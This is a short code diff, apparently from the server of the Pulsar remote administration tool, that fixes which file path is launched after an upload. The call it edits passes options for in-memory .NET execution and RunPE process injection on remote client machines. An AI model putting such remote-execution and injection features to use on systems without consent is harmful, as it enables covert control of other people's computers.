@@ -203,7 +203,8 @@ namespace Pulsar.Server.Forms
 
                     if (transfer.Status == "Completed")
                     {
-                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
+                        var pathToStart = transfer.Type == Enums.TransferType.Upload ? transfer.LocalPath : transfer.RemotePath;
+                        handler.TaskHandler.StartProcess(pathToStart, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
                     }
                     return;
                 }
